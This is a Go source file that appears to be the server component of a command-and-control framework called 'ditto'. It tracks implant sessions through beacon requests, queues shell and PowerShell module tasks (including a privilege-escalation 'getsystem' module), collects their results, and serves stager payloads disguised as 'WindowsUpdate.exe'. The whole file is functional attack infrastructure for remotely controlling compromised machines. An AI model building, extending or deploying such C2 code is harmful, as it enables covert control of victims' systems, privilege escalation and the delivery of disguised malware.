package transport

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base32"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/ditto/ditto/certificates"
	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/tasks"
)

// Server handles C2 server operations
type Server struct {
	config *core.Config
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
	sessions      map[string]*Session
	sessionsMu    sync.RWMutex
	handler       *http.ServeMux
	server        *http.Server
	taskQueue     *tasks.Queue
	moduleGetter  func(string, map[string]string) (string, error) // Function to get module script by ID with optional params
	stagerGetter  func(string) ([]byte, error)                    // Function to get stager payload by callback URL
}

// Session represents a client session
type Session struct {
	ID          string
	RemoteAddr  string
	ConnectedAt time.Time
	LastSeen    time.Time
	Metadata    map[string]interface{}
}

// NewServer creates a new C2 server with its own task queue
func NewServer(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *Server {
	return NewServerWithTaskQueue(config, logger, tasks.NewQueue(1000))
}

// NewServerWithTaskQueue creates a new C2 server with a shared task queue
func NewServerWithTaskQueue(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, taskQueue *tasks.Queue) *Server {
	s := &Server{
		config:    config,
		logger:    logger,
		sessions:  make(map[string]*Session),
		handler:   http.NewServeMux(),
		taskQueue: taskQueue,
	}

	s.setupRoutes()
	return s
}

// SetModuleGetter sets the function to retrieve module scripts
// The getter function will be wrapped to accept optional parameters
func (s *Server) SetModuleGetter(getter func(string) (string, error)) {
	// Store the original getter and create a wrapper that accepts params
	originalGetter := getter
	s.moduleGetter = func(moduleID string, params map[string]string) (string, error) {
		// For now, ignore params and use original getter
		// In the future, we can enhance this to re-process with params
		return originalGetter(moduleID)
	}
}

// SetModuleGetterWithParams sets a module getter that accepts parameters
func (s *Server) SetModuleGetterWithParams(getter func(string, map[string]string) (string, error)) {
	s.moduleGetter = getter
}

func (s *Server) setupRoutes() {
	// Beacon endpoint
	s.handler.HandleFunc("/beacon", s.handleBeacon)

	// Task endpoint
	s.handler.HandleFunc("/task", s.handleTask)

	// Result endpoint
	s.handler.HandleFunc("/result", s.handleResult)

	// Module endpoint
	s.handler.HandleFunc("/module/", s.handleModule)

	// Stager endpoint - serves payloads for download (used by getsystemsafe)
	s.handler.HandleFunc("/stager", s.handleStager)

	// Health check
	s.handler.HandleFunc("/health", s.handleHealth)
}

// Start starts the C2 server
func (s *Server) Start(listenAddr string) error {
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			// HTTP/2 required cipher suites (must include at least one)
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,   // HTTP/2 required
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, // HTTP/2 required
			// Additional secure cipher suites
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		NextProtos: []string{"h2", "http/1.1"}, // Enable HTTP/2
	}

	s.server = &http.Server{
		Addr:         listenAddr,
		Handler:      s.handler,
		TLSConfig:    tlsConfig,
		ReadTimeout:  s.config.Server.ReadTimeout,
		WriteTimeout: s.config.Server.WriteTimeout,
		IdleTimeout:  s.config.Server.KeepAlive,
	}

	s.logger.Info("Starting C2 server on %s", listenAddr)
	s.logger.Debug("Server configuration: TLS=%v, ReadTimeout=%v, WriteTimeout=%v",
		s.config.Server.TLSEnabled, s.config.Server.ReadTimeout, s.config.Server.WriteTimeout)

	if s.config.Server.TLSEnabled {
		certPath := s.config.Server.TLSCertPath
		keyPath := s.config.Server.TLSKeyPath

		// If certificate paths are empty, use defaults
		if certPath == "" || keyPath == "" {
			certPath = "./certs/server.crt"
			keyPath = "./certs/server.key"
			// Update config so subsequent operations use these paths
			s.config.Server.TLSCertPath = certPath
			s.config.Server.TLSKeyPath = keyPath
		}

		// Check if certificates exist, generate if needed
		if _, err := os.Stat(certPath); os.IsNotExist(err) {
			s.logger.Info("TLS certificates not found, generating self-signed certificates...")
			cm := certificates.NewCAManager(s.logger)

			// Generate CA first
			if err := cm.GenerateCA("Ditto CA"); err != nil {
				return fmt.Errorf("failed to generate CA for server certificates: %w\n"+
					"  Solution: Check file permissions or disable TLS in config", err)
			}

			// Generate server certificate
			certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
			if err != nil {
				return fmt.Errorf("failed to generate server certificate: %w\n"+
					"  Solution: Check file permissions or disable TLS in config", err)
			}

			// Ensure cert directory exists
			certDir := filepath.Dir(certPath)
			if err := os.MkdirAll(certDir, 0755); err != nil {
				return fmt.Errorf("failed to create certificate directory %s: %w\n"+
					"  Solution: Check directory permissions or specify a different path", certDir, err)
			}

			// Write certificates
			if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
				return fmt.Errorf("failed to write certificate file %s: %w\n"+
					"  Solution: Check file permissions or specify a different path", certPath, err)
			}
			if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
				return fmt.Errorf("failed to write key file %s: %w\n"+
					"  Solution: Check file permissions or specify a different path", keyPath, err)
			}

			s.logger.Info("TLS certificates generated successfully: %s, %s", certPath, keyPath)
		} else {
			// Verify key file also exists
			if _, err := os.Stat(keyPath); os.IsNotExist(err) {
				s.logger.Error("Certificate exists but key file missing: %s", keyPath)
				return fmt.Errorf("TLS certificate exists but key file not found: %s\n"+
					"  Solution: Generate new certificates or provide both cert and key files", keyPath)
			}
			s.logger.Debug("Using existing TLS certificates: %s, %s", certPath, keyPath)
		}

		s.logger.Info("Starting TLS server on %s", listenAddr)
		if err := s.server.ListenAndServeTLS(certPath, keyPath); err != nil && err != http.ErrServerClosed {
			s.logger.Error("TLS server failed: %v", err)
			return fmt.Errorf("TLS server failed: %w", err)
		}
		return nil
	}

	s.logger.Info("Starting HTTP server on %s", listenAddr)
	if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		s.logger.Error("HTTP server failed: %v", err)
		return fmt.Errorf("HTTP server failed: %w", err)
	}
	return nil
}

func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	s.logger.Debug("Incoming beacon request from %s (method: %s, headers: %v)",
		r.RemoteAddr, r.Method, r.Header)

	sessionID := r.Header.Get("X-Session-ID")
	newSessionCreated := false

	s.sessionsMu.Lock()
	var session *Session

	if sessionID != "" {
		// Session ID provided - find existing session by ID (highest priority)
		session, _ = s.sessions[sessionID]
		if session != nil {
			s.logger.Debug("Session ID provided: %s (found: %v)", sessionID, session != nil)
		} else {
			s.logger.Debug("Session ID provided: %s (not found in sessions map)", sessionID)
		}
	}

	// If session not found by ID, try to match by IP address (ignore port)
	// This handles NAT/proxy scenarios where source port changes
	if session == nil && sessionID != "" {
		// Extract IP from RemoteAddr
		clientIP, _, _ := net.SplitHostPort(r.RemoteAddr)
		if clientIP != "" {
			for id, existingSession := range s.sessions {
				existingIP, _, _ := net.SplitHostPort(existingSession.RemoteAddr)
				if existingIP == clientIP {
					// IP matches - use the existing session ID
					session = existingSession
					sessionID = id
					s.logger.Debug("Matched existing session by IP: %s -> %s (session ID: %s)", clientIP, id, sessionID)
					break
				}
			}
		}
	}

	// If still no session, try matching by full RemoteAddr (legacy behavior)
	if session == nil {
		for id, existingSession := range s.sessions {
			if existingSession.RemoteAddr == r.RemoteAddr {
				session = existingSession
				sessionID = id
				s.logger.Debug("Matched existing session by RemoteAddr: %s -> %s", r.RemoteAddr, id)
				break
			}
		}
	}

	if session == nil {
		// Truly new session - generate new ID
		sessionID = generateSessionID()
		session = &Session{
			ID:          sessionID,
			RemoteAddr:  r.RemoteAddr,
			ConnectedAt: time.Now(),
			LastSeen:    time.Now(),
			Metadata:    make(map[string]interface{}),
		}
		s.sessions[sessionID] = session
		newSessionCreated = true
		s.logger.Info("[SESSION] New session created: %s from %s", ShortSessionID(sessionID), r.RemoteAddr)
		s.logger.Debug("Total active sessions: %d", len(s.sessions))
	} else {
		// Existing session - update LastSeen
		session.LastSeen = time.Now()
		// Update RemoteAddr in case it changed (NAT, etc.)
		if session.RemoteAddr != r.RemoteAddr {
			s.logger.Debug("Session %s RemoteAddr changed: %s -> %s", sessionID, session.RemoteAddr, r.RemoteAddr)
			session.RemoteAddr = r.RemoteAddr
		}
		s.logger.Debug("[SESSION] Existing session updated: %s (last seen: %v)", ShortSessionID(sessionID), session.LastSeen)
	}
	s.sessionsMu.Unlock()

	// Read client metadata
	var metadata map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&metadata); err == nil {
		session.Metadata = metadata
		s.logger.Debug("Received metadata for session %s: %v", sessionID, metadata)
	} else if err.Error() != "EOF" {
		s.logger.Debug("Failed to decode metadata for session %s: %v", sessionID, err)
	}

	// Return any pending tasks
	tasks := s.getPendingTasks(sessionID)
	s.logger.Debug("Returning %d pending tasks for session %s", len(tasks), sessionID)

	// Calculate adaptive sleep interval with constant lifeline
	// If there are pending tasks, use shorter interval (1-2 seconds)
	// Otherwise use minimum keepalive interval to maintain constant lifeline
	adaptiveSleep := s.config.Communication.KeepAliveInterval.Seconds()
	if adaptiveSleep == 0 {
		// Fallback to Sleep if KeepAliveInterval not set
		adaptiveSleep = s.config.Communication.Sleep.Seconds()
	}
	if len(tasks) > 0 {
		// Active tasking - use fast interval (1-2 seconds with jitter)
		adaptiveSleep = 1.5 // Base 1.5 seconds when tasks are pending
		s.logger.Debug("Adaptive sleep: tasks pending, using fast interval %.2fs", adaptiveSleep)
	} else {
		// No tasks - use keepalive interval to maintain constant lifeline
		s.logger.Debug("Adaptive sleep: no tasks, using keepalive interval %.2fs for constant lifeline", adaptiveSleep)
	}

	response := map[string]interface{}{
		"session_id": sessionID,
		"tasks":      tasks,
		"sleep":      adaptiveSleep,
		"jitter":     s.config.Communication.Jitter,
	}

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		s.logger.Error("Failed to encode beacon response for session %s: %v", sessionID, err)
		return
	}

	s.logger.Debug("Beacon response sent successfully for session %s", sessionID)

	// Trigger notification for new sessions (only for truly new ones)
	if newSessionCreated {
		// This will be handled by syncSessionsWithContext
	}
}

func (s *Server) handleModule(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Extract module ID from URL path (/module/powershell/privesc/getsystem)
	moduleID := strings.TrimPrefix(r.URL.Path, "/module/")
	if moduleID == "" {
		http.Error(w, "Module ID required", http.StatusBadRequest)
		return
	}

	// Get task ID from query parameter to retrieve task parameters
	taskID := r.URL.Query().Get("task_id")
	sessionID := r.Header.Get("X-Session-ID")

	s.logger.Info("[MODULE] Session %s fetching module: %s (task: %s)", 
				ShortSessionID(sessionID), moduleID, taskID)
	s.logger.Debug("Module request for %s (task: %s, session: %s) from %s", moduleID, taskID, sessionID, r.RemoteAddr)

	if s.moduleGetter == nil {
		http.Error(w, "Module getter not configured", http.StatusInternalServerError)
		return
	}

	// Extract parameters from task if task ID provided
	params := make(map[string]string)
	if taskID != "" && s.taskQueue != nil {
		task := s.taskQueue.Get(taskID)
		if task != nil && task.Parameters != nil {
			// Convert task parameters to map[string]string
			for k, v := range task.Parameters {
				if str, ok := v.(string); ok {
					params[k] = str
				} else {
					params[k] = fmt.Sprintf("%v", v)
				}
			}
			s.logger.Debug("Task %s requested module %s with %d parameters", taskID, moduleID, len(params))
		}
	}

	script, err := s.moduleGetter(moduleID, params)
	if err != nil {
		s.logger.Error("Failed to get module %s: %v", moduleID, err)
		// Mark task as failed to prevent retries
		if taskID != "" && s.taskQueue != nil {
			s.taskQueue.UpdateStatus(taskID, "failed")
		}
		// Return clear error message
		if strings.Contains(err.Error(), "module not found") {
			http.Error(w, fmt.Sprintf("Module not found: %s", moduleID), http.StatusNotFound)
		} else {
			http.Error(w, fmt.Sprintf("Failed to process module %s: %v", moduleID, err), http.StatusInternalServerError)
		}
		return
	}

	response := map[string]interface{}{
		"script": script,
	}

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		s.logger.Error("Failed to encode module response: %v", err)
		return
	}

	s.logger.Info("[MODULE] Module script sent: %s (task: %s, session: %s)", 
		moduleID, taskID, ShortSessionID(sessionID))
	s.logger.Debug("Module script sent for %s", moduleID)
}

func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		s.logger.Error("Task request received without session ID from %s", r.RemoteAddr)
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}

	s.logger.Debug("Task request from session %s (from %s)", sessionID, r.RemoteAddr)

	tasks := s.getPendingTasks(sessionID)
	s.logger.Debug("Retrieved %d pending tasks for session %s", len(tasks), sessionID)

	// Mark tasks as in-progress and schedule removal for stuck tasks
	for _, taskMap := range tasks {
		if taskID, ok := taskMap["id"].(string); ok {
			s.logger.Debug("Marking task %s as in_progress for session %s", taskID, sessionID)
			if s.taskQueue != nil {
				s.taskQueue.UpdateStatus(taskID, "in_progress")
				// Remove task if it's been stuck in progress for too long (10 minutes)
				// This prevents memory leaks from tasks that never complete
				go func(id string) {
					time.Sleep(10 * time.Minute)
					if task := s.taskQueue.Get(id); task != nil && task.Status == "in_progress" {
						s.logger.Debug("Removing stuck task %s after 10 minute timeout", id)
						s.taskQueue.Remove(id)
					}
				}(taskID)
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(map[string]interface{}{
		"tasks": tasks,
	}); err != nil {
		s.logger.Error("Failed to encode task response for session %s: %v", sessionID, err)
		return
	}

	s.logger.Debug("Task response sent successfully for session %s", sessionID)
}

func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		s.logger.Error("Result request received without session ID from %s", r.RemoteAddr)
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}

	s.logger.Debug("Result request from session %s (from %s)", sessionID, r.RemoteAddr)

	var result map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		s.logger.Error("Failed to decode result JSON from session %s: %v", sessionID, err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	taskType, _ := result["type"].(string)
	taskID, _ := result["task_id"].(string)
	resultValue, _ := result["result"].(string)
	
	// Enhanced logging for module execution
	if taskType == "module" {
		// Get task command to identify which module was executed
		var moduleID string
		if s.taskQueue != nil {
			if task := s.taskQueue.Get(taskID); task != nil {
				moduleID = task.Command
			}
		}
		
		if moduleID != "" {
			s.logger.Info("[MODULE] Session %s completed module: %s (task: %s)", 
				ShortSessionID(sessionID), moduleID, taskID)
		} else {
			s.logger.Info("[MODULE] Session %s completed module execution (task: %s)", 
				ShortSessionID(sessionID), taskID)
		}
		
		// Log result preview (first 200 chars)
		if len(resultValue) > 0 {
			preview := resultValue
			if len(preview) > 200 {
				preview = preview[:200] + "..."
			}
			s.logger.Debug("[MODULE] Result preview: %s", preview)
		}
	} else if taskType == "shell" {
		s.logger.Info("[SHELL] Session %s completed command execution (task: %s)", 
			ShortSessionID(sessionID), taskID)
	} else {
		s.logger.Info("[TASK] Session %s completed task (type: %s, task: %s)", 
			ShortSessionID(sessionID), taskType, taskID)
	}

	// Update task status and remove after completion
	if taskID != "" {
		if s.taskQueue != nil {
			s.taskQueue.SetResult(taskID, result)
			s.logger.Debug("Task %s result stored, scheduling removal", taskID)
			// Remove task after a longer delay to allow result processing (5 minutes for async checking)
			go func() {
				time.Sleep(5 * time.Minute)
				s.taskQueue.Remove(taskID)
				s.logger.Debug("Task %s removed after result processing", taskID)
			}()
		}
	}

	w.WriteHeader(http.StatusOK)
	if _, err := w.Write([]byte("OK")); err != nil {
		s.logger.Error("Failed to write result response: %v", err)
	}
}

func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	s.logger.Debug("Health check request from %s", r.RemoteAddr)
	w.WriteHeader(http.StatusOK)
	if _, err := w.Write([]byte("OK")); err != nil {
		s.logger.Error("Failed to write health check response: %v", err)
	}
}

// handleStager serves payload binaries for download (used by getsystemsafe)
func (s *Server) handleStager(w http.ResponseWriter, r *http.Request) {
	s.logger.Debug("Stager request from %s", r.RemoteAddr)
	
	// Get callback URL from request (could be in query param or header)
	callbackURL := r.URL.Query().Get("callback")
	if callbackURL == "" {
		callbackURL = r.Header.Get("X-Callback-URL")
	}
	if callbackURL == "" {
		// Try to infer from request
		scheme := "http"
		if r.TLS != nil {
			scheme = "https"
		}
		callbackURL = fmt.Sprintf("%s://%s", scheme, r.Host)
	}
	
	// If we have a stager getter, use it
	if s.stagerGetter != nil {
		payload, err := s.stagerGetter(callbackURL)
		if err != nil {
			s.logger.Error("Failed to generate stager: %v", err)
			http.Error(w, "Failed to generate stager", http.StatusInternalServerError)
			return
		}
		
		// Set headers for binary download
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=WindowsUpdate.exe")
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(payload)))
		w.WriteHeader(http.StatusOK)
		
		if _, err := w.Write(payload); err != nil {
			s.logger.Error("Failed to write stager response: %v", err)
		}
		s.logger.Info("Served stager payload (%d bytes) to %s", len(payload), r.RemoteAddr)
		return
	}
	
	// Fallback: return a simple error
	http.Error(w, "Stager generation not configured", http.StatusNotImplemented)
}

// SetStagerGetter sets the function to generate stager payloads
func (s *Server) SetStagerGetter(getter func(string) ([]byte, error)) {
	s.stagerGetter = getter
}

func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
	pending := s.taskQueue.GetPending()
	tasks := make([]map[string]interface{}, 0, len(pending))

	for _, task := range pending {
		// Skip tasks that are already in progress or failed - don't retry them
		if task.Status == "in_progress" || task.Status == "failed" {
			continue
		}

		// Filter tasks by session if specified in parameters
		if task.Parameters != nil {
			if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
				if taskSessionID != sessionID {
					continue
				}
			}
		}

		tasks = append(tasks, map[string]interface{}{
			"id":         task.ID,
			"type":       task.Type,
			"command":    task.Command,
			"parameters": task.Parameters,
		})
	}

	return tasks
}

func generateSessionID() string {
	// Generate short session ID similar to Sliver/Empire (8-10 characters)
	// Use base32 encoding for readability (no ambiguous chars like 0/O, 1/I)
	bytes := make([]byte, 6)
	rand.Read(bytes)
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(bytes)
	return strings.ToLower(encoded[:8]) // Use first 8 characters
}

// ShortSessionID returns a shortened version of session ID for logging
func ShortSessionID(id string) string {
	if len(id) <= 8 {
		return id
	}
	return id[:8]
}

// EnqueueTask adds a task to the queue for a specific session
func (s *Server) EnqueueTask(task *tasks.Task) error {
	return s.taskQueue.Add(task)
}

// GetSessions returns all active sessions
func (s *Server) GetSessions() map[string]*Session {
	s.sessionsMu.RLock()
	defer s.sessionsMu.RUnlock()

	// Create a copy to avoid race conditions
	sessions := make(map[string]*Session, len(s.sessions))
	for id, session := range s.sessions {
		sessions[id] = session
	}
	return sessions
}

// Stop stops the C2 server
func (s *Server) Stop() error {
	if s.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		return s.server.Shutdown(ctx)
	}
	return nil
}
